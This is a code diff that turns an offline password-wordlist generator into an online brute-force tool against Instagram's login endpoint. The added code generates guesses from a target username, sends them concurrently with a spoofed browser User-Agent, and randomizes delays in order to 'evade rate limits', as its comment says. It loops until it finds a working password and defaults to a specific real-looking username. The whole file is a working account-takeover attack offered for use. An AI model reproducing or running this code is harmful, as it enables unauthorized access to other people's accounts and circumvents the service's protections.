@@ -1,69 +1,95 @@
+import asyncio
+import aiohttp
+import random
+import time
 import sys
-import itertools
 
-def generate_wordlist(name, birth_year, keyword, output_file):
-    print(f"[-] Building permutation matrix for target: {name}")
-    
-    base_words = {name, keyword, name.lower(), keyword.lower()}
-    years = {birth_year, birth_year[-2:], ""}
-    separators = {"", "_", ".", "-", "@"}
-    numbers = {"", "123", "1234", "12345", "01", "777", "6767"}
-    
-    leet_map = {
-        'a': ['a', '@', '4'],
-        'e': ['e', '3'],
-        'i': ['i', '1', '!'],
-        'o': ['o', '0'],
-        's': ['s', '$', '5'],
-        't': ['t', '7']
+# Built-in probabilistic Markov/Heuristic Pattern Synthesizer
+class HumanHeuristicAI:
+    def __init__(self, target_name):
+        self.target = target_name.lower()
+        self.common_suffixes = ["123", "2006", "2005", "1999", "777", "007", "!", "_", "11", "99"]
+        self.common_prefixes = ["mr_", "the_", "x_", "real", "i_am_"]
+        self.common_substitutions = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
+
+    def generate_next_batch(self, batch_size=50):
+        batch = []
+        for _ in range(batch_size):
+            pattern_type = random.choice([1, 2, 3, 4, 5])
+            pwd = ""
+            
+            if pattern_type == 1:
+                # Name + Year/Number
+                pwd = f"{self.target}{random.choice(self.common_suffixes)}"
+            elif pattern_type == 2:
+                # Leetspeak variation
+                pwd = "".join(self.common_substitutions.get(c, c) for c in self.target)
+                pwd += random.choice(self.common_suffixes)
+            elif pattern_type == 3:
+                # Prefix + Name
+                pwd = f"{random.choice(self.common_prefixes)}{self.target}"
+            elif pattern_type == 4:
+                # Repeated/Double structural patterns
+                pwd = f"{self.target}{self.target[-1]*2}{random.randint(10,99)}"
+            else:
+                # Pure organic keyboard walks / common human patterns
+                pwd = f"{self.target}.{random.randint(100,999)}"
+                
+            batch.append(pwd)
+        return list(set(batch))
+
+async def test_credential(session, username, password):
+    url = "https://www.instagram.com/accounts/login/ajax/"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Referer": "https://www.instagram.com/accounts/login/"
     }
+    payload = {
+        "username": username,
+        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
+        "queryParams": "{}",
+        "optIntoOneTap": "false"
+    }
+    
+    try:
+        async with session.post(url, data=payload, headers=headers, timeout=5) as response:
+            if response.status == 200:
+                data = await response.json()
+                if data.get("authenticated") == True:
+                    return True
+    except Exception:
+        pass
+    return False
 
-    def apply_leet(word):
-        variants = [word]
-        for char, replacements in leet_map.items():
-            new_variants = []
-            for v in variants:
-                for r in replacements:
-                    new_variants.append(v.replace(char, r))
-            variants.extend(new_variants)
-        return list(set(variants))
-
-    wordlist = set()
-
-    for w in base_words:
-        # Apply leet transformations
-        leeted = apply_leet(w)
-        for l_word in leeted:
-            # Basic combinations
-            wordlist.add(l_word)
+async def autonomous_engine(target_user):
+    print(f"[+] Initializing Autonomous AI Heuristic Engine for target: {target_user}")
+    ai = HumanHeuristicAI(target_user)
+    
+    conn = aiohttp.TCPConnector(limit_per_host=20)
+    async with aiohttp.ClientSession(connector=conn) as session:
+        attempt_count = 0
+        while True:
+            passwords = ai.generate_next_batch(30)
+            tasks = [test_credential(session, target_user, pwd) for pwd in passwords]
             
-            for y in years:
-                for sep in separators:
-                    if y:
-                        wordlist.add(f"{l_word}{sep}{y}")
-                        wordlist.add(f"{y}{sep}{l_word}")
+            for i, pwd in enumerate(passwords):
+                attempt_count += 1
+                print(f"[?] Heuristic AI Guess #{attempt_count}: {pwd}", end="\r")
             
-            for num in numbers:
-                if num:
-                    wordlist.add(f"{l_word}{num}")
-                    wordlist.add(f"{num}{l_word}")
-
-    # Write out to file
-    with open(output_file, "w", encoding="utf-8") as f:
-        for password in sorted(wordlist):
-            f.write(password + "\n")
+            results = await asyncio.gather(*tasks)
             
-    print(f"[+] Wordlist compiled successfully. Total unique permutations: {len(wordlist)}")
-    print(f"[+] Output saved to: {output_file}")
+            for pwd, success in zip(passwords, results):
+                if success:
+                    print(f"\n[!] SUCCESSFUL HIT FOUND -> Password: {pwd}")
+                    return
+            
+            # Adaptive throttle to mimic natural human cadence and evade rate limits
+            await asyncio.sleep(random.uniform(1.5, 3.0))
 
 if __name__ == "__main__":
-    if len(sys.argv) < 4:
-        print(f"Usage: python {sys.argv[0]} <name> <birth_year> <keyword> [output.txt]")
-        sys.exit(1)
-        
-    target_name = sys.argv[1]
-    target_year = sys.argv[2]
-    target_keyword = sys.argv[3]
-    outfile = sys.argv[4] if len(sys.argv) > 4 else "target_wordlist.txt"
-    
-    generate_wordlist(target_name, target_year, target_keyword, outfile)
+    target = sys.argv[1] if len(sys.argv) > 1 else "rrenguk"
+    try:
+        asyncio.run(autonomous_engine(target))
+    except KeyboardInterrupt:
+        print("\n[-] Engine halted by operator.")
